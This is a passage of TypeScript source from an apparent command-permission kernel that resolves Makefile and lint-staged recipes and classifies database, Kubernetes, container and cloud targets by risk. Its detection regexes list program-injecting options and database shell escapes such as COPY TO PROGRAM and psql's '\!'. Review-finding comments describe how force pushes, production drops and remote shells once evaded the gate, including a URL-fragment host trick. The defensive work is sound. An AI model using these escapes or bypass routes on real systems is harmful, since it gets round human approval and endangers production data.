        // makes `evil.o`, running that rule's recipe — a `git push --force` in the reported case — and the walk
        // returned here at depth 1, where the blindness gap below is only recorded for depth 0 (exit review 7).
        else if (merged.hasPatternRules)
          touchedBlind.push(`prerequisite "${t}" has no literal rule and a pattern rule may build it`);
        return;
      }
      if (depth >= 8) {
        partial = `prerequisite chain of "${t}" is deeper than this resolver follows`;
        return;
      }
      // A TARGET-SPECIFIC VARIABLE IS IN EFFECT FOR THE TARGET AND FOR EVERY PREREQUISITE IN ITS CHAIN. The walk
      // looked it up for the target being expanded only, so `deploy: GIT = git push --force` with the recipe on
      // the prerequisite `push` was analysed with the global value (exit review 8).
      const inheritedHere = merged.targetVars.get(t);
      if (inheritedHere)
        for (const [k, val] of inheritedHere) {
          const into = merged.targetVars.get('\0inherited') ?? new Map<string, string>();
          into.set(k, val);
          merged.targetVars.set('\0inherited', into);
        }
      for (const p of rule.prereqs) walk(p, depth + 1);
      for (const rl of rule.recipes) {
        const cmd = rl.replace(/^[@+-]+/, '').trim();
        if (!cmd) continue;
        // make expands the line BEFORE the shell sees it: the variables it splices in can carry whole commands,
        // and `$(shell …)` runs while it expands. Both are handed over as what they are (exit review 4).
        const tv0 = merged.targetVars.get(t);
        const inherited = merged.targetVars.get('\0inherited');
        const tv = tv0 || inherited ? new Map([...(inherited ?? []), ...(tv0 ?? [])]) : undefined;
        // a target-specific value wins over the global one, and a command-line assignment still wins over both
        const cliWins = new Map([...cliVars].filter(([k]) => !merged.overridden.has(k)));
        const vars = tv ? new Map([...merged.vars, ...tv, ...cliWins]) : merged.vars;
        const auto = { '@': t, '<': rule.prereqs[0] ?? '', '^': rule.prereqs.join(' '), '+': rule.prereqs.join(' '), '?': rule.prereqs.join(' ') };
        // EVERY BRANCH OF A CONDITIONAL IS A CANDIDATE: the line is expanded once per value the resolver saw,
        // bounded so a file full of conditionals cannot blow the walk up.
        let budget = 6;
        for (const [name, values] of merged.altVars) {
          if (budget <= 0) break;
          if (!new RegExp(`\\$[({]${name}[)}]`).test(cmd)) continue;
          for (const v of values) {
            if (budget-- <= 0) break;
            const alt = expandMakeText(cmd, new Map([...vars, [name, v]]), auto);
            for (const inner of alt.ran) body.push(inner);
            if (alt.text !== null && alt.text.trim()) body.push(alt.text.trim());
          }
        }
        const expanded = expandMakeText(cmd, vars, auto);
        for (const inner of expanded.ran) body.push(inner);
        // WHAT IS KNOWN IS HANDED OVER EVEN WHEN THE LINE IS NOT FULLY KNOWN. The prefix up to the first unknown
        // still carries the command, so `git push $(UNKNOWN)` keeps its locked deny instead of degrading to an
        // opacity ASK, which is a weaker verdict for a command the resolver could read perfectly well
        // (exit review 5).
        if (expanded.text === null && expanded.prefix.trim()) body.push(expanded.prefix.trim());
        if (expanded.text === null) {
          // ONE unresolvable line no longer discards the rest: the resolved lines are still analysed and the
          // remainder is reported (challenge 5, finding 8 — "known but incomplete body")
          partial = `a recipe line of "${t}" expands to text this resolver cannot determine`;
          continue;
        }
        if (expanded.text.trim()) body.push(expanded.text.trim());
      }
    };
    // whatever make runs while PARSING runs whichever target was asked for
    for (const c of merged.parseRan) body.push(c);
    for (const t of wanted) walk(t, 0);
    const provenance = { source: merged.sources.join(','), fingerprint: fingerprint(merged.text) };
    const mkName = merged.sources[0] ?? makeDir;
    const rebinds = [...cliRebinds, ...merged.rebinds];
    const bodyEnv = childEnvironment(env, {
      cwd: makeDir,
      cwdVerified: env.cwdVerified,
      // the binding dimension is INHERITED by everything this recipe invokes: a makefile that assigns SHELL or
      // PATH re-points every program named anywhere below it, not only on its own recipe lines
      ...(rebinds.length ? { binding: { kind: 'redefined' as const, why: rebinds[0]! } } : {}),
      config: { read: merged.sources, unresolved: [] },
      sources: Object.fromEntries(merged.sources.map((f) => [f, fingerprint(merged.text)])),
    });
    // ...and what the makefile EXPORTS is in every recipe's environment, which is how the recipe's `psql` finds
    // a production host and its `tsc` loads a Node require hook that the recipe text never mentions.
    for (const [k, v] of merged.exported) {
      const expanded = expandMakeText(v, merged.vars).text ?? v;
      if (EXECUTION_ENV_INPUTS.test(k) || TARGET_ENV_RE.test(k)) bodyEnv.envInputs[k] = expanded;
    }
    // THE KEY'S SEPARATOR MUST NOT BE A LEGAL TARGET NAME CHARACTER. A comma is: `make build test` keyed as
    // `build,test`, byte-identical to the key of `make build,test`, so a recipe that re-entered make with that
    // literal goal hit the cycle guard and its `git push --force` was never analysed (exit review 7).
    // ...AND THE COMMAND-LINE VARIABLES, which change what every recipe expands to. Omitting them made
    // `make run` and its own `make CMD="git push origin main" run` the SAME execution, so the cycle guard
    // stopped the second one and its recipe was never analysed (exit review 8).
    const cliKey = [...cliVars].map(([k, v]) => `${k}=${v}`).sort().join('\u0000');
    const key = `make:${merged.sources.join('\u0000') || makeDir}:${wanted.join('\u0000')}:${cliKey}`;
    if (!wanted.length)
      return { kind: 'make-target', key, body: null, reason: 'no target and no default goal', resolution: 'ABSENT_VERIFIED' };
    const gaps: Unresolved[] = [];
    // A target this resolver could not find is PROVEN absent only when nothing in the makefile could define it
    // invisibly. Returning early on the first missing target also discarded every gap found for the OTHER goals
    // on the same command line, so `make nosuch deploy` claimed proven absence over an unresolved `deploy`
    // (exit review 2).
    const blind = merged.unsupported.length > 0 || merged.hasPatternRules || merged.unsupportedFor.size > 0;
    if (blind)
      for (const t of missing)
        gaps.push({ what: 'body', where: t, why: `target "${t}" is not visible to this resolver` });
    if (partial) gaps.push({ what: 'body', where: wanted.join(','), why: partial });
    for (const u of merged.unsupported) gaps.push({ what: 'config', where: mkName, why: u });
    for (const u of touchedBlind) gaps.push({ what: 'body', where: wanted.join(','), why: u });
    // BINDING RESOLUTION — a recipe whose interpreter or lookup path the makefile itself redefines does not mean
    // what it says. The text is honest and the programs are not, so the body is analysed AND the binding gap is
    // reported rather than the whole target being declared unknown.
    for (const r of rebinds)
      gaps.push({ what: 'binding', where: mkName, why: `the environment redefines program lookup: ${r}` });
    for (const i of cliInputs)
      gaps.push({ what: 'context', where: i.slice(0, i.indexOf('=')), why: `make is given ${i}, which changes what it reads` });
    // SELF-MODIFYING PRODUCER — make REMAKES a makefile that is itself a target, then restarts and runs the new
    // one. The source EGO read is then the pre-image of what executes (challenge 6, finding 9).
    for (const src of merged.sources)
      if (merged.rules.has(src) || merged.rules.has(src.slice(makeDir.length + 1)))
        gaps.push({
          what: 'freshness',
          where: src,
          why: 'this makefile is itself a target of this makefile: make remakes it and restarts',
        });
    return {
      kind: 'make-target',
      key,
      body,
      bodyEnv,
      provenance,
      // .ONESHELL hands the WHOLE recipe to one shell, so a `cd` leaks into the next line (challenge 5, finding 10)
      oneShell: merged.oneShell,
      unresolved: gaps,
      reason: gaps.length
        ? `Makefile target ${wanted.join(', ')}; NOT fully resolved: ${gaps[0]!.why}`
        : `Makefile target ${wanted.join(', ')}`,
      resolution: gaps.length ? 'PARTIAL' : 'RESOLVED_COMPLETE',
    };
  }
  // lint-staged runs the commands its CONFIG names, so the config is what selects the body. Resolving it is the
  // same configuration-closure rule applied to a tool instead of to git or make — and it is what keeps `git
  // commit` out of the way in the husky + lint-staged setup a large share of JavaScript repositories use.
  if (head === 'lint-staged' || (head === 'npx' && tokens[1] === 'lint-staged')) {
    const pkgPath = findUp(ctx, cwd, 'package.json');
    const candidates = ['.lintstagedrc', '.lintstagedrc.json', '.lintstagedrc.yaml', '.lintstagedrc.yml']
      .map((n) => join(cwd, n))
      .filter((f) => fileExists(f));
    // a JS/CJS/MJS config is code, and code is not resolvable by reading
    // every extension the tool resolves, derived rather than listed: `.lintstagedrc.cjs` was missing and reached
    // ALLOW (decision challenge, finding 1)
    const js = ['lint-staged.config', '.lintstagedrc']
      .flatMap((b) => ['.js', '.mjs', '.cjs', '.ts', '.mts', '.cts'].map((e) => `${b}${e}`))
      .map((n) => join(cwd, n))
      .find((f) => fileExists(f));
    if (js)
      return {
        kind: 'shell-script',
        key: `lint-staged:${js}`,
        body: null,
        reason: 'the lint-staged configuration is JavaScript, so the commands it runs cannot be read',
        resolution: 'UNSUPPORTED',
        unresolved: [{ what: 'config', where: js, why: 'executable configuration' }],
      };
    const src = candidates[0] ?? pkgPath;
    const text = src ? readInsideWorkspace(ctx, src) : null;
    if (!src || text === null)
      return {
        kind: 'shell-script',
        key: `lint-staged:${src ?? cwd}`,
        body: null,
        reason: 'the lint-staged configuration could not be read',
        resolution: src && fileExists(src) ? 'UNREADABLE' : 'ABSENT_VERIFIED',
        unresolved: src ? [{ what: 'config', where: src, why: 'not readable' }] : [],
      };
    let conf: unknown;
    try {
      const parsed = JSON.parse(text) as Record<string, unknown>;
      conf = src === pkgPath ? parsed['lint-staged'] : parsed;
    } catch {
      return {
        kind: 'shell-script',
        key: `lint-staged:${src}`,
        body: null,
        reason: 'the lint-staged configuration is not readable JSON',
        resolution: 'UNREADABLE',
        unresolved: [{ what: 'config', where: src, why: 'unparsable' }],
      };
    }
    if (conf === undefined || conf === null)
      return {
        kind: 'shell-script',
        key: `lint-staged:${src}`,
        body: null,
        reason: 'no lint-staged configuration',
        resolution: 'ABSENT_VERIFIED',
      };
    const body: string[] = [];
    for (const v of Object.values(conf as Record<string, unknown>)) {
      if (typeof v === 'string') body.push(v);
      else if (Array.isArray(v) && v.every((x) => typeof x === 'string')) body.push(...(v as string[]));
      else
        return {
          kind: 'shell-script',
          key: `lint-staged:${src}`,
          body: body.length ? body : null,
          bodyEnv: childEnvironment(env, { cwd, cwdVerified: env.cwdVerified }),
          reason: 'a lint-staged entry is a function rather than a command',
          resolution: 'PARTIAL',
          unresolved: [{ what: 'config', where: src, why: 'a non-literal entry' }],
        };
    }
    return {
      kind: 'shell-script',
      key: `lint-staged:${src}`,
      body,
      bodyEnv: childEnvironment(env, { cwd, cwdVerified: env.cwdVerified }),
      reason: `lint-staged commands from ${src}`,
      resolution: 'RESOLVED_COMPLETE',
      provenance: { source: src, fingerprint: fingerprint(text) },
    };
  }
  if (head === 'git') return resolveGitAmbient(ctx, tokens, env);
  // NO REGISTERED PRODUCER CLAIMS THIS HEAD — which says nothing about whether anything else executes. The
  // AUTHORED vocabulary decides, and THE MOST SPECIFIC ENTRY WINS: an entry may name a head alone (`pytest`) or a
  // head plus the arguments that decide its shape (`go test`, `cmake --version`), so a bounded invocation of a
  // discovering tool stays frictionless without weakening that tool's default.
  const bare = head.replace(/\.(exe|cmd|bat)$/i, '');
  const normTokens = tokens.join(' ');
  const match = (list: readonly string[]): string | null => {
    let best: string | null = null;
    for (const e of list) {
      const hit = e.includes(' ') ? normTokens === e || normTokens.startsWith(e + ' ') : e === bare;
      if (hit && (best === null || e.length > best.length)) best = e;
    }
    return best;
  };
  const v = table.boundedCommands;
  const winner = (
    [
      ['bounded', match(v.bounded)],
      ['installs', match(v.installsDependencies)],
      ['content', match(v.discoversContent)],
    ] as Array<[string, string | null]>
  ).reduce<[string, string | null]>((a, b) => ((b[1]?.length ?? -1) > (a[1]?.length ?? -1) ? b : a), ['none', null]);
  // ACQUIRES third-party code and runs it: the same surface as an npm install lifecycle script, which is already
  // a human gate. Leaving `pip install` and `poetry install` at ALLOW was an inconsistency, not a decision.
  if (winner[0] === 'installs')
    return {
      kind: 'none',
      key: `installs:${winner[1]}`,
      body: null,
      reason: `${bare} acquires third-party code and runs it, which this kernel cannot read`,
      resolution: 'AMBIENT_UNRESOLVED',
      unresolved: [{ what: 'ambient', where: bare, why: 'dependency build and install scripts' }],
    };
  // runs code it locates by PATTERN or by a repository build file. EGO will not emulate the tool.
  if (winner[0] === 'content')
    return {
      kind: 'none',
      key: `discovers:${winner[1]}`,
      body: null,
      reason: `${bare} runs code it locates by pattern or by a build file, which this kernel does not model`,
      resolution: 'UNKNOWN_PRODUCER',
      unresolved: [{ what: 'body', where: bare, why: 'content EGO was never shown' }],
    };
  if (winner[0] === 'bounded')
    return {
      kind: 'none',
      key: `bounded:${winner[1]}`,
      body: null,
      reason: 'bounded command',
      resolution: 'NOT_A_PRODUCER',
    };
  // runs whatever its CONFIGURATION names. Bounded while that configuration is data: the same
  // configuration-closure rule EGO applies to git, make and lint-staged, applied to a tool. These tools search
  // UPWARDS, so the lookup does too — anchoring it to `cwd` let one `cd` flip the verdict.
  for (const entry of v.discoversConfig) {
    const [tool, ...configs] = entry.split(/\s+/);
    if (tool !== bare) continue;
    // the extension variants are DERIVED rather than listed: every one of these tools resolves `.ts`, `.mts` and
    // `.cts` beside the `.js` it was declared with, and listing them by hand missed exactly those (decision
    // challenge, findings 2, 32)
    const variants = configs.flatMap((c) =>
      /\.(js|mjs|cjs)$/.test(c) ? [c, c.replace(/\.(js|mjs|cjs)$/, '.ts'), c.replace(/\.(js|mjs|cjs)$/, '.mts'), c.replace(/\.(js|mjs|cjs)$/, '.cts')] : [c],
    );
    const present =
      variants.map((c) => findUp(ctx, cwd, c)).find((f) => f !== null) ??
      commandLineConfig(tokens, cwd) ??
      dataConfigNamingCode(ctx, cwd, bare);
    if (present === null || present === undefined)
      return {
        kind: 'none',
        key: `bounded-config:${bare}`,
        body: null,
        reason: `${bare} configuration is data`,
        resolution: 'NOT_A_PRODUCER',
      };
    return {
      kind: 'none',
      key: `discovers-config:${present}`,
      body: null,
      reason: `${bare} imports and runs ${present}`,
      resolution: 'UNKNOWN_PRODUCER',
      unresolved: [{ what: 'config', where: present, why: 'executable configuration' }],
    };
  }
  // AN ASSIGNMENT IS NOT A PROGRAM. `TODAY=$(date +%F)` and `n=$((i+1))` have no head at all — the name is bound
  // and nothing is executed — but the whole token was read as a program name that the vocabulary had never heard
  // of, so the most ordinary line in any script was opaque once script bodies started being classified line by
  // line (exit review 4). The substituted command is a segment of its own and is classified there, and an
  // assignment that redefines EXECUTION is still carried by the binding dimension, which this does not touch.
  // A name that redefines EXECUTION ITSELF — PATH, LD_PRELOAD, BASH_ENV, GIT_SSH_COMMAND — is excluded: binding
  // it changes what every later command in that shell runs, which is precisely an execution closure.
  // a name this unit DEFINED as a function: its body was handed over at the definition, so calling it adds no
  // closure and it is not an unmodelled program (exit review 5)
  if (env.definedNames?.has(bare))
    return {
      kind: 'none',
      key: `function:${bare}`,
      body: null,
      reason: `${bare} is a function defined and analysed in this unit`,
      resolution: 'NOT_A_PRODUCER',
    };
  const assigned = /^([A-Za-z_][A-Za-z0-9_]*)\+?=/.exec(bare);
  if (assigned && !ENV_INJECT_RE.test(assigned[1]!))
    return {
      kind: 'none',
      key: `assignment:${bare}`,
      body: null,
      reason: 'a name binding executes nothing',
      resolution: 'NOT_A_PRODUCER',
    };
  // THE DEFAULT IS NOT A POSITIVE CLAIM: a head the vocabulary never classified is unknown, not proven absent.
  return {
    kind: 'none',
    key: `unmodelled:${bare}`,
    body: null,
    reason: `${bare} is not declared bounded, so what else it executes is unknown`,
    resolution: 'UNKNOWN_PRODUCER',
    unresolved: [{ what: 'body', where: bare, why: 'no entry in the bounded-command vocabulary' }],
  };
}

function opaqueHit(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  norm: string,
  reason: string,
  unread = true,
  capability:
    | 'command.script-opaque'
    | 'command.ambient-unresolved'
    | 'command.unmodelled-closure' = 'command.script-opaque',
): CapabilityHit {
  return {
    capability,
    verdict: verdictFor(table, ctx, capability),
    via: reason,
    segment: norm,
    absolute: false,
    // true when something WILL run that could not be read; such a hit survives the opacity filter of an enclosing
    // declared class, because that is exactly the case the fail-safe rule exists for
    opaqueUnread: unread,
  };
}

// ---------------------------------------------------------------------------------------------------------------
// Q98 target/effect classification. Authorization is target-aware: a Kubernetes or database command is judged by
// WHERE it points, never by the tool's name. `kubectl apply` at a kind cluster is local work; the same command at a
// shared cluster is an external effect; with no resolvable target it is TARGET_UNCLASSIFIED, never a silent "local".
// ---------------------------------------------------------------------------------------------------------------

/** Environment variables that choose which database or cluster a client talks to. */
/** Options that hand an arbitrary program to an otherwise well-behaved command. The list is a real family, not a
 *  spelling chase: every entry is "this option's value is executed". */
const PROGRAM_OPERAND_LONG =
  '--use-compress-program|--checkpoint-action|--to-command|--rsh-command|--rsh|--exec|--ok-dir|-TT|--unzip-command|--filter=.*command|--pre|--hostname-bin|--upload-pack|--receive-pack|--editor|--pager|--ssh-command|--proxy-command' +
  // The COMPILER family. Adding compilers and coreutils to the bounded vocabulary without extending this rule
  // reopened the very class the rule exists for: `clang -B dir` and `gcc -wrapper prog` run prog instead of the
  // real tool, `-fplugin=` and `-specs=` load code into the compiler, `go build -toolexec` wraps every tool
  // invocation, `javac -processor` runs an annotation processor, and `sort --compress-program` runs a program
  // under a capability literally named command.read-only (decision challenge, findings 5, 25, 26, 30).
  '|--post-renderer|--exec-path|--compress-program|--wrapper|-wrapper|-fplugin|-fplugin-arg-[\\w-]+|-specs|--specs|-toolexec|-ldflags|-gccgo|-B|-processor|-processorpath|-Xplugin|--plugin|-load|-Xclang|-fpass-plugin|--preprocessor|-no-integrated-cpp' +
  // rsync's `-e ssh` names a remote SHELL. The lookahead matched those letters ANYWHERE in the value, so a
  // database statement beginning `show …` contained `sh` and `mysql -e 'show tables'` — a read of the local
  // socket — was classified as naming an unbounded program (exit review 7). The value must BE the program.
  // ...and an ASSIGNMENT is not a program name: `docker run -e SHELL=/bin/sh myapp` sets a variable inside the
  // container and was read as naming a remote shell (exit review 7)
  '|-e(?=\\s+(?![A-Za-z_][A-Za-z0-9_]*=)(?:\\S*/)?(ssh|sh|bash|zsh|dash|python3?|perl|ruby|node)(\\s|$))';
const PROGRAM_OPERAND_LONG_RE = new RegExp(`\\s(${PROGRAM_OPERAND_LONG})(=|\\s)`);
/** the short forms whose value is GLUED to the letter: `gcc -B/tmp/evil`, `clang -Xclangfoo`, `-loadplugin` */
const PROGRAM_OPERAND_GLUED_RE = /\s(-B|-Xclang|-Xplugin|-load|-fplugin|-specs|-wrapper|-agentlib|-agentpath|-javaagent)[:=]?\S/;
/** the archive tools where a short `-I` names a compression PROGRAM (for make it is an include directory) */
const PROGRAM_OPERAND_TOOL_RE = /^(tar|bsdtar|gtar|pax)\b/;
const PROGRAM_OPERAND_RE = new RegExp(`\\s(${PROGRAM_OPERAND_LONG}|-I)(=|\\s)`);

const DB_CLIENT_HEADS = new Set([
  'psql', 'mysql', 'mariadb', 'mongosh', 'mongo', 'sqlite3', 'redis-cli', 'clickhouse-client', 'cqlsh',
  // ADMINISTRATION TOOLS ARE CLIENTS TOO. `mysqladmin -h prod-db.acme.com drop appdb` drops a production
  // database and was not enrolled at all; `clickhouse client` is the two-word spelling of `clickhouse-client`
  // (exit review 7).
  'mysqladmin', 'mysqldump', 'mysqlsh', 'pg_dump', 'pg_restore', 'pg_dumpall', 'pgbench', 'createdb', 'dropdb',
  'valkey-cli', 'influx', 'clickhouse',
]);
const DB_EXECUTES_UNREAD =
  // `\!` is psql's shell escape. Inside DOUBLE quotes the backslash is consumed before this test ever sees it,
  // so the de-escaped form — a `-c` value that BEGINS with `!` — is matched too. Matching a bare `!` anywhere
  // would be far too broad; anchoring it to the start of the statement is exactly the meta-command position
  // (challenge 8, finding 14).
  // The family is "this client runs something it was handed": a program file, a shell escape, a loadable
  // extension, or a COPY in either direction. Enumerating only one direction of COPY and only sqlite's `.shell`
  // left the neighbours open (decision challenge, findings 12, 34).
  /\s\S*\.(sql|psql|ddl|cql|js|py|rb|lua)(\s|$)|\s(-f|--file|-init|--init)(=|\s)|\s<\s|\\!|(-c|--command|--eval|-e|--execute)(=|\s+)["']?\s*!|\.(shell|system|read|load|import|output|once|excel|cd)\b|\bSYSTEM\b|\b(load_extension|sqlite3_load_extension)\b|\bCREATE\s+(VIRTUAL\s+TABLE|FUNCTION|EXTENSION)\b|COPY\b[\s\S]*\b(TO|FROM)\s+PROGRAM\b|\\copy\b[\s\S]*\bPROGRAM\b|\bsource\s+\S/i;

const TARGET_ENV_RE =
  // THE CONTAINER ENGINE IS SELECTED BY ENVIRONMENT TOO. `DOCKER_HOST` and `DOCKER_CONTEXT` were enrolled in the
  // RESOLVER but not here, so the assignment was stripped as noise and never re-attached: the engine survived
  // only while the assignment happened to stay leading in the raw segment. Inside an `if`, a loop body, a `trap`
  // or a herestring it did not, and a shell on a production daemon asked (exit review 6, generated cross-product).
  /^(PGHOST|PGHOSTADDR|PGSERVICE|PGDATABASE|PGPORT|PGURI|MYSQL_HOST|MYSQL_TCP_PORT|REDIS_HOST|REDIS_URL|MONGODB_URI|MONGO_URL|DATABASE_URL|FLYWAY_URL|KUBECONFIG|KUBERNETES_MASTER|KUBE_CONTEXT|HELM_KUBECONTEXT|HELM_KUBEAPISERVER|CLICKHOUSE_HOST|DOCKER_HOST|DOCKER_CONTEXT|CONTAINER_HOST|BUILDX_BUILDER)$/;
const TARGET_ENV_HEADS = new Set([
  'psql', 'mysql', 'mariadb', 'mongosh', 'mongo', 'redis-cli', 'clickhouse-client', 'cqlsh', 'sqlite3',
  'kubectl', 'oc', 'helm', 'kustomize', 'flyway', 'liquibase', 'alembic', 'dbmate', 'prisma', 'knex', 'sequelize',
  'mysqladmin', 'mysqldump', 'pg_dump', 'pg_restore', 'pg_dumpall', 'createdb', 'dropdb', 'clickhouse',
  'docker', 'podman', 'nerdctl', 'docker-compose', 'podman-compose', 'lima', 'colima',
  // a runner does not change what the wrapped tool connects to
  'npx', 'pnpm', 'yarn', 'bunx', 'pnpx', 'bun', 'npm',
]);

const K8S_MUTATING_VERBS = new Set([
  'apply', 'create', 'delete', 'patch', 'edit', 'scale', 'rollout', 'replace', 'drain', 'cordon', 'uncordon',
  'taint', 'exec', 'cp', 'annotate', 'label', 'set', 'expose', 'run', 'autoscale', 'attach', 'port-forward',
  'debug', 'certificate', 'proxy', 'auth', 'apply-set', 'wait',
]);
const HELM_MUTATING_VERBS = new Set(['install', 'upgrade', 'uninstall', 'delete', 'rollback', 'push', 'test']);
/** capabilities that assert a LOCAL target without ever resolving one; each is re-judged against the real target */
const TARGET_SENSITIVE: Record<string, 'k8s' | 'db' | 'container' | 'cloud'> = {
  // The container runtime was the one high-impact tool not enrolled in the Q98 target model, so
  // `kubectl --context production apply` was DENY and `docker --context production stack deploy` was ALLOW on the
  // identical signal. The accepted product decision was about running a container on the LOCAL daemon; it said
  // nothing about a remote engine (decision challenge, finding 1).
  'container.run': 'container',
  'container.build': 'container',
  'container.prune': 'container',
  'k8s.local.apply': 'k8s',
  'k8s.local.delete': 'k8s',
  'k8s.local.test': 'k8s',
  'db.local.query': 'db',
  'db.local.migrate': 'db',
  'db.local.drop': 'db',
  'db.local.start': 'db',
  // The cloud CLIs were never enrolled at all: their verdict was decided by the matcher alone, which skips global
  // options to reach the service and the verb and therefore discards `--endpoint-url` as noise. So an S3 emulator
  // on the developer's own machine was an ABSOLUTE deny — one a human cannot approve — while the identical signal
  // on a container engine or a database was resolved properly (exit review 4). The whole family is enrolled: a
  // partial enrolment would leave `iam`, `kms`, `secretsmanager` and `route53` at :4566 denied, and LocalStack
  // emulates all of them.
  'production.cloud.mutate': 'cloud',
  'production.dns.mutate': 'cloud',
  'production.iam.mutate': 'cloud',
  'production.kms.mutate': 'cloud',
  'production.secrets.mutate': 'cloud',
};

/** THE TOOL DECIDES WHETHER A TARGET EXISTS, NOT THE CAPABILITY THAT HAPPENED TO WIN. Matchers are
 *  first-match-wins, so a segment can be classified by a capability that says nothing about a target while still
 *  naming a tool whose whole job is to act on one: `docker exec` matches the script-opaque matcher — an
 *  interactive shell IS opaque — and `command.script-opaque` is not enrolled, so
 *  `DOCKER_HOST=tcp://prod… docker exec box sh` opened a shell on a production engine at ASK, while the same
 *  engine with `docker run` was DENY (exit review 6). Enrolling the HEAD closes the class rather than the verb:
 *  every capability a container/k8s/db tool can be classified as is now re-targeted.
 *
 *  Deliberately NOT extended to `cloud`: that kind is the kernel's one DE-escalation (it REPLACES the hit with
 *  `cloud.local.mutate`), so inferring it from a head could lower a verdict that was reached for another reason.
 *  The three kinds here only ever raise. */
/** The head of the COMMAND, not the first token of the segment: leading `NAME=VALUE` assignments are the
 *  environment the command runs with, not the program it runs. `DOCKER_HOST=… docker exec` reads its head as the
 *  assignment, which is no tool at all (exit review 6, generated cross-product). */
function commandHead(norm: string): string {
  const t = tokenize(norm);
  let i = 0;
  while (i < t.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(t[i]!)) i++;
  return (t[i] ?? '').replace(/^.*\//, '');
}

const TARGET_SENSITIVE_HEAD: Array<[RegExp, 'k8s' | 'db' | 'container']> = [
  [/^(docker|podman|nerdctl|docker-compose|podman-compose|lima|colima)$/, 'container'],
  [/^(kubectl|oc|helm|kustomize)$/, 'k8s'],
  [/^(psql|mysql|mariadb|mongosh|mongo|redis-cli|clickhouse-client|cqlsh|influx)$/, 'db'],
];

/** The host an endpoint names, with scheme, credentials, port, IPv6 brackets and path removed. */
function endpointHost(v: string): string {
  // THE AUTHORITY ENDS AT THE FIRST `/`, `?` OR `#`. Cutting only at `/` left a FRAGMENT in the string, and a
  // fragment may contain an `@`: `https://s3.amazonaws.com#@localhost:4566` then read as the host `localhost`,
  // which defeated the whole-host comparison the container resolver and the cloud de-escalation both rest on —
  // a production engine reaching ALLOW and an absolute core deny reaching ASK (exit review 5). Every URL parser
  // cuts the authority first and looks for userinfo INSIDE it; so does this one now.
  let h = v.replace(/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//, '');
  const cut = h.search(/[/?#]/);
  if (cut >= 0) h = h.slice(0, cut);
  const at = h.lastIndexOf('@');
  if (at >= 0) h = h.slice(at + 1);
  const bracketed = /^\[([^\]]*)\]/.exec(h);
  if (bracketed) return bracketed[1]!;
  const colon = h.lastIndexOf(':');
  return colon >= 0 && /^\d+$/.test(h.slice(colon + 1)) ? h.slice(0, colon) : h;
}

/** A token is unresolvable when it is a variable, a substitution marker or a glob: it could name anything. */
const isOpaqueTarget = (v: string): boolean => /^\$|\$\{|\$SUBST|`|[*?]/.test(v);

/** LOCAL is the weakest answer and PRODUCTION the strongest: when several signals resolve, the strongest decides. */
const TARGET_SEVERITY: Record<TargetClass, number> = {
  LOCAL: 0,
  UNCLASSIFIED: 1,
  EXTERNAL: 2,
  PRODUCTION: 3,
};

/** Every kubectl verb, so the verb can be found BY NAME rather than by skipping option values. */
const KUBECTL_VERBS = new Set([
  ...['get', 'describe', 'logs', 'top', 'explain', 'api-resources', 'api-versions', 'version', 'config', 'cluster-info', 'wait', 'diff', 'events', 'kustomize'],
  ...['apply', 'create', 'delete', 'patch', 'edit', 'scale', 'rollout', 'replace', 'drain', 'cordon', 'uncordon', 'taint', 'exec', 'cp', 'annotate', 'label', 'set', 'expose', 'run', 'autoscale', 'attach', 'port-forward', 'debug', 'certificate', 'proxy', 'auth', 'apply-set'],
]);
/** kubectl/helm options that consume the NEXT token; their value must never be mistaken for the verb. */
const K8S_VALUE_OPTS =
  /^(-n|--namespace|--context|--kube-context|--kubeconfig|--server|-s|--kube-apiserver|--token|--user|--username|--password|--cluster|--as|--as-uid|--as-group|--cache-dir|--certificate-authority|--client-certificate|--client-key|--request-timeout|--tls-server-name|-o|--output|-f|--filename|-l|--selector|--field-selector|--chart|--repo|--version|--values|--set|--set-string|--set-file|-v|--v|--profile|--profile-output|--registry-config|--repository-config|--repository-cache|--burst-limit|--qps|--post-renderer|--post-renderer-args|--key-file|--cert-file|--ca-file|--keyring|--log-flush-frequency|--warnings-as-errors|--tls-server-name|--password-stdin|--kuberc|--default-not-ready-toleration-seconds|--default-unreachable-toleration-seconds|--storage-driver-[a-z-]+|--application-metrics-count-limit|--container-hints|--docker[a-z-]*|--global-housekeeping-interval|--housekeeping-interval|--max-housekeeping-interval|--event-storage-[a-z-]+|--boot-id-file|--machine-id-file|--add-dir-header|--alsologtostderr|--log-backtrace-at|--log-dir|--log-file|--log-file-max-size|--logtostderr|--one-output|--skip-headers|--skip-log-headers|--stderrthreshold|--vmodule)$/;

const HELM_VERBS = new Set([
  ...['list', 'ls', 'status', 'get', 'history', 'show', 'search', 'template', 'lint', 'version', 'env', 'dependency'],
  ...['install', 'upgrade', 'uninstall', 'delete', 'rollback', 'push', 'test', 'repo', 'plugin', 'create', 'package'],
]);

/** Every value of an option, in every spelling — a client applies the LAST one, so all of them are classified and
 *  the most restrictive decides rather than trusting whichever appears first (round 14). */
function optionValues(tokens: string[], short: string, longs: string[]): string[] {
  const out: string[] = [];
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    let matched = false;
    for (const l of longs) {
      if (t === l) {
        if (tokens[i + 1] !== undefined) out.push(tokens[i + 1]!);
        matched = true;
      } else if (t.startsWith(l + '=')) {
        out.push(t.slice(l.length + 1));
        matched = true;
      }
      if (matched) break;
    }
    if (matched || !short || !t.startsWith('-') || t.startsWith('--')) continue;
    const at = t.indexOf(short, 1);
    if (at < 0) continue;
    // the characters between the dash and the option letter must themselves be option letters: without this, the
    // `h` inside `-url=jdbc:postgresql://localhost:5432/app` reads as `-h` and invents a host (round 14)
    if (!/^-[A-Za-z0-9]*$/.test(t.slice(0, at))) continue;
    const glued = t.slice(at + 1);
    if (glued) out.push(glued);
    else if (tokens[i + 1] !== undefined) out.push(tokens[i + 1]!);
  }
  return out;
}

function matchesAnyGlob(name: string, patterns: string[]): boolean {
  const n = name.toLowerCase();
  return patterns.some((p) => globToRegExp(p.toLowerCase()).test(n));
}

function hasProductionMarker(name: string, markers: string[]): boolean {
  const n = name.toLowerCase();
  return markers.some((m) => new RegExp(`(^|[^a-z0-9])${m.toLowerCase()}([^a-z0-9]|$)`).test(n));
}

function classifyTargetName(
  name: string,
  localPatterns: string[],
  targets: LocalTargets,
): TargetClass {
  if (!name || isOpaqueTarget(name)) return 'UNCLASSIFIED';
  if (hasProductionMarker(name, targets.productionMarkers)) return 'PRODUCTION';
  if (matchesAnyGlob(name, localPatterns)) return 'LOCAL';
  return 'EXTERNAL';
}

